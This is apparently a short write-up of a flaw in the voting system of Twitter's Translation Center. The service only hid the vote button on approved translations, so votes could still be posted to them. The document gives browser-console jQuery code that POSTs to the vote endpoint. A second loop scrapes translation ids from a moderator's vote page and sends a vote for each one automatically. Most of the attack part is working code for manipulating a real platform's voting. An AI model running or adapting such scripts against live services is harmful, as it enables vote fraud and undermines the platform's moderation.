# Twitter Translation Center Bug/Hack

**Twitter Translation Center Bug/Hack**

After analyzing the voting system of the TTC,

I noticed that the sending of the voting request was done through the POST method in the url 

```https://translate.twitter.com/translations/vote``` each translation has an id with 8 digits

When the translation is already approved, the only thing they do is hide The button, 

that's when I realized that if I take the id of this approved translation and send it with the POST method the vote would be confirmed

**Ex:**

To send I used the Browser Console, you can find by pressing the "f12"

``` 
$.ajax({
  type: "POST",
  url: 'https://translate.twitter.com/translations/vote',
  data: 'id=12345678',
});
```

#It's working!
After my theory was confirmed, I decided to automate the procedure.

If you join the profile of a TCC moderator, you may note that in the "Votes" or "Translations" area 

they will contain translations and votes already approved by this moderator..

*Ex:*

```
https://translate.twitter.com/user/MODERATOR/votes
```
With the help of JavaScript

I was able to extract the ID's of the approved translations and send them via POST as a normal voting day

```
var c = document.getElementsByClassName("toggle").length;
for (i = 0; i < c; i++){
	var id = (document.getElementsByClassName("toggle").item(i).getAttribute("data-id"));	
$.ajax({
  type: "POST",
  url: 'https://translate.twitter.com/translations/vote',
  data: 'id=' + id ,
});
console.log('foi ' + id);
}
```

![alt tag](http://url/to/img.png)
